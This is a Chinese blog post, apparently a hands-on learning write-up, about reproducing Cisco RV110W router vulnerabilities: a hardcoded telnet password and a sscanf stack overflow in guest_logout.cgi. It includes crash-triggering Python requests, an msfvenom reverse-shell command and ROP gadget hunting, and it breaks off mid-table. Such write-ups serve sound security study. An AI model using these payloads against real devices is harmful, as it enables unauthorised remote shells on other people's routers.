        <content type="html"><![CDATA[<h1 id="RV110W路由器漏洞复现"><a href="#RV110W路由器漏洞复现" class="headerlink" title="RV110W路由器漏洞复现"></a>RV110W路由器漏洞复现</h1><blockquote><p>被<code>xuanxuan</code>老师种草了~，”一定要摸真实的设备”这句话余音绕梁，终于狠下心买了一个二手的<code>RV110W</code>，开始我的路由器漏洞复现之路，希望能学到点东西！</p></blockquote><img src="/2021/10/05/RV110W%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-2020%E5%B9%B4%E5%BC%BA%E7%BD%91%E6%9D%AF%E8%B5%9B%E9%A2%98/25-1633419468547.jpg" class=""><h4 id="0x00-开端"><a href="#0x00-开端" class="headerlink" title="0x00 开端"></a>0x00 开端</h4><p>拿到路由器接上电源网线，电脑连接上<code>RV100W</code>就遇到了第一个问题，怎么进入后台？好吧，萌新没怎么玩过路由器，都是按照路由器背面的IP来登录，好巧不巧，它的背面很干净，啥都没有，看<code>lemon</code>师傅的视频看到10.10.10.1兴致冲冲的去访问，结果进了一个交换机的登录界面，奇了怪了，后来询问<code>lemon</code>师傅，要看路由器的网关IP进去，至此第一个问题顺利解决，初始密码是<code>cisco:cisco</code></p><img src="/2021/10/05/RV110W%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-2020%E5%B9%B4%E5%BC%BA%E7%BD%91%E6%9D%AF%E8%B5%9B%E9%A2%98/1.png" class=""><p>很顺利的进入后台，进入<code>Administration =&gt; Firmware/Language Upgrade</code>，看到固件的版本不对，是多少来着忘了，反正很老的一个固件，下面提供了固件的升级，我直接就拿<code>xuanxuan</code>老师的固件刷进去了，等了好一会，它就重启了，再次进入就发现固件版本已经变成1.2.2.5了</p><p><a href="https://xuanxuanblingbling.github.io/assets/attachment/RV110W_FW_1.2.2.5.bin">固件链接</a></p><img src="/2021/10/05/RV110W%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-2020%E5%B9%B4%E5%BC%BA%E7%BD%91%E6%9D%AF%E8%B5%9B%E9%A2%98/2-1633422409683.png" class=""><h4 id="0x01-信息收集"><a href="#0x01-信息收集" class="headerlink" title="0x01 信息收集"></a>0x01 信息收集</h4><p>到这，准备工作已经完成了！</p><p>那就开始真实环境下的漏洞复现了，首先一般我们想要找一个设备的漏洞，那得先看有什么服务吧！那么从服务很容易联想到端口，所以最开始我们先用<strong>端口扫描</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sU -sT -p0-65535 192.168.1.1</span><br></pre></td></tr></table></figure><img src="/2021/10/05/RV110W%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-2020%E5%B9%B4%E5%BC%BA%E7%BD%91%E6%9D%AF%E8%B5%9B%E9%A2%98/3.png" class=""><p>扫完了，就想看看源码，就要对<strong>固件进行解包</strong>，固件提取拿以前的一张图来看</p><img src="/2021/10/05/RV110W%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-2020%E5%B9%B4%E5%BC%BA%E7%BD%91%E6%9D%AF%E8%B5%9B%E9%A2%98/2.png" class=""><p>这里就是<code>xuanxuan</code>老师那边拿的，算是互联网搜索吧！</p><p><code>xuanxuan</code>老师那说要安装<code>sasquatch</code>这个组件，但是在<code>AttifyOs</code>那直接<code>binwalk</code>就开了？？？可能是<code>AttifyOs</code>的<code>binwalk</code>比较完整吧，不太清楚</p><img src="/2021/10/05/RV110W%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-2020%E5%B9%B4%E5%BC%BA%E7%BD%91%E6%9D%AF%E8%B5%9B%E9%A2%98/4.png" class=""><p>解包完成之后，查看<code>busybox</code>的版本是<code>MIPS32</code>小端序的路由器</p><img src="/2021/10/05/RV110W%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-2020%E5%B9%B4%E5%BC%BA%E7%BD%91%E6%9D%AF%E8%B5%9B%E9%A2%98/5.png" class=""><p>之后就是<strong>搜集漏洞信息</strong></p><h4 id="0x02-漏洞利用"><a href="#0x02-漏洞利用" class="headerlink" title="0x02 漏洞利用"></a>0x02 漏洞利用</h4><h3 id="CVE-2020-3330"><a href="#CVE-2020-3330" class="headerlink" title="CVE-2020-3330"></a>CVE-2020-3330</h3><p>之前扫到23端口是开着的，搜索发现大多数文件都是链接到rc这个文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">&gt; find . | xargs grep -ri &quot;admin:\\\$&quot;</span><br><span class="line">Binary file ./sbin/rc matches</span><br><span class="line">grep: ./usr/local/libexec/ipsec/setup: No such file or directory</span><br><span class="line">Binary file ./sbin/rc matches</span><br><span class="line">Binary file ./sbin/gpio_check matches</span><br><span class="line">Binary file ./sbin/write matches</span><br><span class="line">Binary file ./sbin/ca_manage matches</span><br><span class="line">Binary file ./sbin/ses_led matches</span><br><span class="line">Binary file ./sbin/ipsec_fqdn_detect matches</span><br><span class="line">Binary file ./sbin/sendudp matches</span><br><span class="line">Binary file ./sbin/check_ses_led matches</span><br><span class="line">Binary file ./sbin/stats matches</span><br><span class="line">Binary file ./sbin/ddns_update_data matches</span><br><span class="line">Binary file ./sbin/services matches</span><br><span class="line">Binary file ./sbin/restore matches</span><br><span class="line">Binary file ./sbin/info matches</span><br><span class="line">Binary file ./sbin/preinit matches</span><br><span class="line">Binary file ./sbin/qkvpn_rekey matches</span><br><span class="line">Binary file ./sbin/ipsec-up matches</span><br><span class="line">Binary file ./sbin/calc_vpnconn_time matches</span><br><span class="line">Binary file ./sbin/bootnv matches</span><br><span class="line">Binary file ./sbin/ipsec_wanlink matches</span><br><span class="line">Binary file ./sbin/usb_test matches</span><br><span class="line">Binary file ./sbin/icmp_echo matches</span><br><span class="line">Binary file ./sbin/cron_iaprule matches</span><br><span class="line">Binary file ./sbin/waninfo matches</span><br><span class="line">Binary file ./sbin/ntpd matches</span><br><span class="line">Binary file ./sbin/detectwan matches</span><br><span class="line">Binary file ./sbin/ipsec_fw matches</span><br><span class="line">Binary file ./sbin/ddns_success matches</span><br><span class="line">Binary file ./sbin/cpu_usage matches</span><br><span class="line">Binary file ./sbin/cron_aclrule matches</span><br><span class="line">Binary file ./sbin/firewall matches</span><br><span class="line">Binary file ./sbin/generate_md5sum matches</span><br><span class="line">Binary file ./sbin/init matches</span><br><span class="line">Binary file ./sbin/listen matches</span><br><span class="line">Binary file ./sbin/check_ps matches</span><br><span class="line">Binary file ./sbin/snmpdc matches</span><br><span class="line">Binary file ./sbin/process_monitor matches</span><br><span class="line">Binary file ./sbin/rc matches</span><br></pre></td></tr></table></figure><p>把放到IDA里面，搜字符串定位关键函数</p><img src="/2021/10/05/RV110W%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-2020%E5%B9%B4%E5%BC%BA%E7%BD%91%E6%9D%AF%E8%B5%9B%E9%A2%98/26.jpg" class=""><p>随便翻下就有了个明文字符串，拿去解一下MD5</p><img src="/2021/10/05/RV110W%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-2020%E5%B9%B4%E5%BC%BA%E7%BD%91%E6%9D%AF%E8%B5%9B%E9%A2%98/27.jpg" class=""><p>密码就出来了，我们就可以通过<code>telnet</code>来传<code>gdbserver</code>就不用拆机器了</p><img src="/2021/10/05/RV110W%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-2020%E5%B9%B4%E5%BC%BA%E7%BD%91%E6%9D%AF%E8%B5%9B%E9%A2%98/6.png" class=""><h3 id="CVE-2020-3331-CVE-2020-3323"><a href="#CVE-2020-3331-CVE-2020-3323" class="headerlink" title="CVE-2020-3331/CVE-2020-3323"></a>CVE-2020-3331/CVE-2020-3323</h3><h5 id="Diff"><a href="#Diff" class="headerlink" title="Diff"></a>Diff</h5><p>1.2.2.5这个固件的版本相对来说比较旧，所以一个很常用的手法就是去<code>diff</code>文件，拿已经修复此漏洞的固件进行<code>diff</code>，能够更容易的去定位漏洞点，<code>diff</code>有俩常见的工具，<code>bindiff</code>和<code>diaphora</code></p><h6 id="bindiff"><a href="#bindiff" class="headerlink" title="bindiff"></a>bindiff</h6><p><a href="https://www.zynamics.com/software.html">bindiff下载链接</a></p><p>选<code>.msi</code>下载就行，安装路径为IDA的主目录，之后打开IDA在插件那边就能看见<code>bindiff</code>了，把要比对的文件先打开再保存成<code>idb</code>文件，然后点<code>bindiff</code>选择要比对的<code>idb</code>就能开始比对啦！</p><p><code>ps：user</code>的目录不要有中文，否则你会很不幸</p><img src="/2021/10/05/RV110W%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-2020%E5%B9%B4%E5%BC%BA%E7%BD%91%E6%9D%AF%E8%B5%9B%E9%A2%98/8.jpg" class=""><p>越往下滑呢！它就越有可能是目标，因为越下面就越不匹配，由于漏洞描述是前台的洞，所以选中的那个函数有可能就是目标，这里简单讲讲我认识什么的前台什么的后台？</p><p>前台：与用户进行交互的界面</p><p>后台：对用户隐藏的那部分数据处理与逻辑处理</p><img src="/2021/10/05/RV110W%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-2020%E5%B9%B4%E5%BC%BA%E7%BD%91%E6%9D%AF%E8%B5%9B%E9%A2%98/9.jpg" class=""><p>查阅资料得知，每个基本块颜色的说明：</p><blockquote><p>绿色：相同的基本块</p><p>黄色：修改的基本块</p><p>红色：删掉的基本块</p><p>灰色：新加的基本块</p></blockquote><p>右键<code>view flow graphs</code>就可以查看汇编代码对比，找了半天才找到，就离谱</p><p><code>ps：</code>千万不要直接把两个<code>idb</code>直接丢到<code>idb</code>，不然你会知道什么叫浪费时间（<code>bindiff</code>直接打开的分析速度感人</p><img src="/2021/10/05/RV110W%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-2020%E5%B9%B4%E5%BC%BA%E7%BD%91%E6%9D%AF%E8%B5%9B%E9%A2%98/10.jpg" class=""><p>除此之外，你如果对二进制的漏洞点以及危险函数比较熟悉的话，双击点进去，很容易就看到这个没有限制长度的<code>sscanf</code></p><img src="/2021/10/05/RV110W%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-2020%E5%B9%B4%E5%BC%BA%E7%BD%91%E6%9D%AF%E8%B5%9B%E9%A2%98/11.jpg" class=""><h6 id="diaphora"><a href="#diaphora" class="headerlink" title="diaphora"></a>diaphora</h6><p>吐了，老是报错整不好了…，<code>bindiff</code>也能用的啦！只不过是看汇编，<code>diaphora</code>可以看源码，下次再补上…</p><p>**%[ ^;];%*[ ^=]=%[ ^\n]**是一个正则表达式，%是代表选择，%*是过滤    </p><blockquote><ol><li><code>%[^;]</code>：分号前的所有字符都要</li><li><code>;%*[^=]</code>：分号后，等号前的字符都不要</li><li><code>=%[^\n]</code>：等号后，换行符前的所有字符都要</li></ol></blockquote><p>看不是很懂，那就上个<code>demo</code>吧！</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> var1[<span class="number">5</span>] = <span class="string">&quot;aaa&quot;</span>;</span><br><span class="line"><span class="keyword">char</span> var2[<span class="number">5</span>] = <span class="string">&quot;bbb&quot;</span>;</span><br><span class="line"><span class="keyword">char</span> var3[<span class="number">5</span>] = <span class="string">&quot;ccc&quot;</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> welcome[<span class="number">100</span>] = <span class="string">&quot;wElc0me t= reGuIar @xpr&amp;ss!0n w0rld;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">sscanf</span>(welcome,<span class="string">&quot;%[^;];%*[^=]=%[^\n]&quot;</span>, var1, var2, var3);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s\n%s\n%s\n&quot;</span>,var1,var2,var3);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们看到运行结果，还是很奇怪，留坑了…</p><img src="/2021/10/05/RV110W%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-2020%E5%B9%B4%E5%BC%BA%E7%BD%91%E6%9D%AF%E8%B5%9B%E9%A2%98/12.png" class=""><p>发包测试一下是否存在溢出，发送GET报文发现并没有什么事情发生</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;https://192.168.1.1/guest_logout.cgi&quot;</span></span><br><span class="line">payload = &#123;<span class="string">&quot;cmac&quot;</span>:<span class="string">&quot;12:af:aa:bb:cc:dd&quot;</span>,<span class="string">&quot;submit_button&quot;</span>:<span class="string">&quot;status_guestnet.asp&quot;</span>+<span class="string">&#x27;aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa&#x27;</span>,<span class="string">&quot;cip&quot;</span>:<span class="string">&quot;192.168.1.100&quot;</span>&#125;</span><br><span class="line">requests.get(url, data=payload, verify=<span class="literal">False</span>, timeout=<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>但是发生POST报文的时候，发现<code>web</code>页面在疯狂转圈圈，就是崩了，至于为什么只测试这两个请求头，二进制狗表示不太清楚…</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;https://192.168.1.1/guest_logout.cgi&quot;</span></span><br><span class="line">payload = &#123;<span class="string">&quot;cmac&quot;</span>:<span class="string">&quot;12:af:aa:bb:cc:dd&quot;</span>,<span class="string">&quot;submit_button&quot;</span>:<span class="string">&quot;status_guestnet.asp&quot;</span>+<span class="string">&#x27;aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa&#x27;</span>,<span class="string">&quot;cip&quot;</span>:<span class="string">&quot;192.168.1.100&quot;</span>&#125;</span><br><span class="line">requests.post(url, data=payload, verify=<span class="literal">False</span>, timeout=<span class="number">1</span>)</span><br></pre></td></tr></table></figure><img src="/2021/10/05/RV110W%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-2020%E5%B9%B4%E5%BC%BA%E7%BD%91%E6%9D%AF%E8%B5%9B%E9%A2%98/23.png" class=""><h4 id="确定溢出偏移"><a href="#确定溢出偏移" class="headerlink" title="确定溢出偏移"></a>确定溢出偏移</h4><p>崩了就意味着，有漏洞点的存在，那接下来就是调试的事情了，用的是海特实验室的<code>gdbserver</code>，其实还有一个是<code>gef</code>开发者编译的<code>gdbserver</code></p><p><a href="https://github.com/DasSecurity-HatLab/HatLab_IOT_Wiki">海特实验室 IOT_Wiki</a></p><p><a href="https://github.com/hugsy/gdb-static">gef author</a></p><p>启动一个窗口起一个简单的http服务器</p><p><strong>python2:</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">➜  python -m SimpleHTTPServer 8080</span><br></pre></td></tr></table></figure><p><strong>python3：</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">➜  python -m http.server 8080</span><br></pre></td></tr></table></figure><p>ps：建议启动浏览器复制链接，真的好用！</p><img src="/2021/10/05/RV110W%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-2020%E5%B9%B4%E5%BC%BA%E7%BD%91%E6%9D%AF%E8%B5%9B%E9%A2%98/15.jpg" class=""><p>再启动一个窗口<code>telnet</code>连接上路由器用<code>wget</code>（路由器里面自带的）挂上<code>gdbserver</code>，就可以远程调试了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">➜  telnet 192.168.1.1</span><br><span class="line">➜  <span class="built_in">cd</span> tmp</span><br><span class="line">➜  wget <span class="string">&quot;http://192.168.181.178:8080/home/laohu/Desktop/gdbserver&quot;</span></span><br><span class="line">➜  chmod +x gdbserver</span><br><span class="line">➜  ps | grep <span class="string">&quot;httpd&quot;</span></span><br><span class="line">➜  ./gdbserver :1234 --attach 356<span class="comment">#看httpd -S的进程号，另一个好像调试不了</span></span><br></pre></td></tr></table></figure><img src="/2021/10/05/RV110W%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-2020%E5%B9%B4%E5%BC%BA%E7%BD%91%E6%9D%AF%E8%B5%9B%E9%A2%98/7.png" class=""><p>传进去之后，恶梦才刚刚开始….我根本想不到这问题出在哪里！尝试换终端（改成<code>dash</code>），换架构（在树莓派上尝试），换目录（换到<code>data</code>目录）之后，终于摸索到了关键原因—-<code>gdbserver</code>本身，各位大师傅们的<code>gdbserver</code>为<code>gdbserver-7.12-mipsel-mips32rel2-v1-sysv</code> ，我死活用不了，我尝试甚至在我朋友上的电脑上尝试都不行，可能大师傅们的电脑是<code>MacOS</code>吧，咱也不知道，咱也不敢问，我最后在换到<code>gdbserver-7.12-mipsel-i-v1-sysv</code>之后，终于可以使用了！</p><img src="/2021/10/05/RV110W%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-2020%E5%B9%B4%E5%BC%BA%E7%BD%91%E6%9D%AF%E8%B5%9B%E9%A2%98/16.jpg" class=""><p>终于…下一个错误来了，<code>gdb-mutilarch</code>进行远程调试的时候，<code>remote</code>上去的时候断不下来，报下面这个错，看到下面<code>capstone</code>好像出现了问题，怀疑是版本过低，重新安装<code>pwntools</code>解决问题</p><p><a href="https://blog.csdn.net/weixin_33674976/article/details/85219451">5年了…Capstone 终于升级到4.0！</a></p><p><a href="https://blog.csdn.net/zhr12321/article/details/116742894">解决方法</a></p><img src="/2021/10/05/RV110W%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-2020%E5%B9%B4%E5%BC%BA%E7%BD%91%E6%9D%AF%E8%B5%9B%E9%A2%98/13.png" class=""><p>此处，终于看到调试界面了，泪目！！！</p><img src="/2021/10/05/RV110W%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-2020%E5%B9%B4%E5%BC%BA%E7%BD%91%E6%9D%AF%E8%B5%9B%E9%A2%98/14.png" class=""><p>来来来，问题怪又来了…，按照大师傅们的做法，按下<code>c</code>之后，输入<code>cyclic 200</code>生成的字符串，就会崩掉，并看到<code>PC</code>寄存器被覆盖…但我…没反应啊！</p><img src="/2021/10/05/RV110W%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-2020%E5%B9%B4%E5%BC%BA%E7%BD%91%E6%9D%AF%E8%B5%9B%E9%A2%98/17.jpg" class=""><p>解决办法就是先在<code>sscanf</code>之前下断点（后面测试其实不用下断点也是一样的，然后再<code>c</code>，接着用<code>exp</code>打一下，就断下来了，原因是因为我们本身就是<code>attach</code>上<code>httpd</code>这个进程，所以这个进程本身还在运行，如果我们打了断点并用<code>exp</code>打过去的话，它就会按照以往正常的业务逻辑去执行，但是再执行的过程中被中断了，所以…就断了下来，再往下走的，我们就能看到<code>PC</code>寄存器被覆盖了！接下来就是常规操作用<code>cyclic -l</code>来计算偏移</p><img src="/2021/10/05/RV110W%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-2020%E5%B9%B4%E5%BC%BA%E7%BD%91%E6%9D%AF%E8%B5%9B%E9%A2%98/19.png" class=""><p>确定好溢出的长度就可以开始利用了，基本上都是<code>ROP+shellcode</code>的形式，那么现在就是生成<code>shellcode</code>和泄露<code>libc</code>获取<code>gadget</code>的问题了</p><h5 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h5><p>shellcode一般来说可以使用以下四种方式获取：</p><ol><li>msfvenom</li><li>shell-storm</li><li>pwntools</li><li>自己编写（简单的<code>shellcode</code>还是可以写写的</li></ol><p>其他都有试过，<code>msf</code>还没试过这里记录一下…<code>msf</code>支持好多版本的<code>shellcode</code>，太香了吧！</p><img src="/2021/10/05/RV110W%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-2020%E5%B9%B4%E5%BC%BA%E7%BD%91%E6%9D%AF%E8%B5%9B%E9%A2%98/18.png" class=""><p>用下面的命令就能生成，注意IP和端口匹配：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">➜  msfvenom -p linux/mipsle/shell_reverse_tcp  LHOST=192.168.1.100 LPORT=8888 --arch mipsle --platform linux -f py -o shellcode.py </span><br></pre></td></tr></table></figure><blockquote><p>总的来说还是：<code>msf</code>更方便好用，并且非常稳。<code>shell-storm</code>找到的种类多，不过偶尔需要手动修改。最后对于真实设备的利用上<code>pwntools</code>会有很多的问题，所以这里不推荐使用<code>pwntools</code>生成<code>shellcode</code></p></blockquote><p><code>shell-storm</code>里面的<code>shellcode</code>也是能用的，不过需要修改IP地址</p><p><a href="http://shell-storm.org/shellcode/files/shellcode-860.php">200 byte Linux MIPS reverse shell shellcode by Jacob Holcomb</a></p><h5 id="ROP"><a href="#ROP" class="headerlink" title="ROP"></a>ROP</h5><p>既然要<code>ROP</code>，那必然要泄露<code>libc</code>，但是在大部分IOT设备中，地址随机化是不会变化的，包括这个设备，所以在<code>maps</code>中加载的<code>libc</code>地址就是它一直使用的<code>libc</code>地址，无论是重启还是换固件版本甚至在<code>RV130</code>中，<code>libc</code>的基地址都一样，这就省去了很多步骤，下面引用<code>xuanxuan</code>老师的一段话：</p><blockquote><p>问了常老师，再次猜测可能是为了效率，编译的时候就把内核的这个功能干掉了，或者当前平台压根就不支持这个功能。先存疑，总之我们发现动态库的基址都是不变的，故我们可以使用程序加载的动态库中的<code>gadget</code>。</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">➜  cat /proc/356/maps</span><br></pre></td></tr></table></figure><img src="/2021/10/05/RV110W%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-2020%E5%B9%B4%E5%BC%BA%E7%BD%91%E6%9D%AF%E8%B5%9B%E9%A2%98/20.png" class=""><p>可以看到很多<code>libc</code>，而<code>libc.so.0</code>的基地址是<strong>2af98000</strong></p><p>得到了<code>libc</code>基地址，只让是寻找一些可用的<code>gadget</code>，我们使用IDA的插件—-<code>mipsrop</code>，由于安装的时候发现，它对IDA 7.5不是很支持，所以还是出了一些小问题，这里记录一下…</p><p><a href="https://www.jianshu.com/p/0f5923fac8d4">解决IDA 无法安装mipsrop插件</a></p><p><a href="https://bbs.pediy.com/thread-266102.htm">IDA 无法安装mipsrop插件</a></p><p>安装成功后呢，在<code>search</code>中就能看到<code>mips rop gadgets</code>，点击之后加载了<code>mipsrop</code>插件了</p><img src="/2021/10/05/RV110W%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-2020%E5%B9%B4%E5%BC%BA%E7%BD%91%E6%9D%AF%E8%B5%9B%E9%A2%98/21.jpg" class=""><p>可以用<code>mipsrop.help()</code>查看<code>mipsrop</code>的一些常用命令</p><p><a href="https://www.cnblogs.com/hac425/p/9416864.html">mipsrop常用命令</a></p><img src="/2021/10/05/RV110W%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-2020%E5%B9%B4%E5%BC%BA%E7%BD%91%E6%9D%AF%E8%B5%9B%E9%A2%98/22.png" class=""><p>在上面的程序加载了很多动态链接库，但是却唯独选择了**/lib/libc.so.0**这个动态链接库来寻找<code>gadget</code>，为啥呢？估计是比较熟悉吧！</p><p>用<code>mipsrop.stackfinders()</code>来寻找一些<code>gadget</code>，这些<code>gadget</code>都是和栈（<code>$sp</code>）相关的：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">Python&gt;mipsrop.stackfinders()</span><br><span class="line">---------------------------------------------------------------------------------------------------------</span><br><span class="line">|  Address     |  Action                                              |  Control Jump                          |</span><br><span class="line">---------------------------------------------------------------------------------------------------------</span><br><span class="line">|  0x0000BA84  |  addiu $a1,$sp,0x158+var_A0                          |  jalr  $s0                             |</span><br><span class="line">|  0x00011918  |  addiu $a2,$sp,0x68+var_40                           |  jalr  $s1                             |</span><br><span class="line">|  0x000250A8  |  addiu $s0,$sp,0x278+var_250                         |  jalr  $fp                             |</span><br><span class="line">|  0x000257A0  |  addiu $a0,$sp,0x38+var_20                           |  jalr  $s0                             |</span><br><span class="line">|  0x00025CAC  |  addiu $a0,$sp,0x38+var_20                           |  jalr  $s3                             |</span><br><span class="line">|  0x0002747C  |  addiu $a0,$sp,0x38+var_20                           |  jalr  $s3                             |</span><br><span class="line">|  0x0002CC00  |  addiu $a0,$sp,0x38+var_10                           |  jalr  $s0                             |</span><br><span class="line">|  0x0002CC08  |  addiu $a0,$sp,0x38+var_10                           |  jalr  $s1                             |</span><br><span class="line">|  0x00035DF4  |  addiu $a1,$sp,0x20+var_8                            |  jalr  $s1                             |</span><br><span class="line">|  0x0003D050  |  addiu $a0,$sp,0x30+var_18                           |  jalr  $a0                             |</span><br><span class="line">|  0x000427A8  |  addiu $s0,$sp,0xB8+var_98                           |  jalr  $s6                             |</span><br><span class="line">|  0x00042E04  |  addiu $v1,$sp,0xF0+var_D0                           |  jalr  $s1                             |</span><br><span class="line">|  0x0000D45C  |  addiu $a0,$sp,0x98+var_80                           |  jr    0x98+var_s4($sp)                |</span><br><span class="line">|  0x0000ED70  |  addiu $a1,$sp,0x20+var_8                            |  jr    0x20+var_s0($sp)                